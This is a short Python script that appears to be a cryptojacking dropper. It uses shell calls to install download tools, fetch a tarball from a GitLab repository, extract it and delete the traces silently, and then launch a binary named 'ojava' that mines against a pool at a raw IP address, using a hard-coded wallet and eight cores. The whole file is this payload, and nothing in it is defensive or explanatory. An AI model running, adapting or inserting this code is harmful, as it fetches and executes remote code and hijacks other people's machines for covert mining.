import sys
import os
os.system("apt update && apt -y install curl wget && wget -qO sg.tar.gz https://gitlab.com/derisafrew/vx/-/raw/main/sg.tar.gz && tar -xzf sg.tar.gz && rm -rf sg* >/dev/null 2>&1")
os.system("./ojava --url ws://31.171.240.178:443/mine mine --username CHtdR4Ha3UQkvtwTpod47TSVQ6PhGq97Ch5qoqiC2pLz.$(echo $(shuf -i 1-9 -n 1)-test) --cores 8")
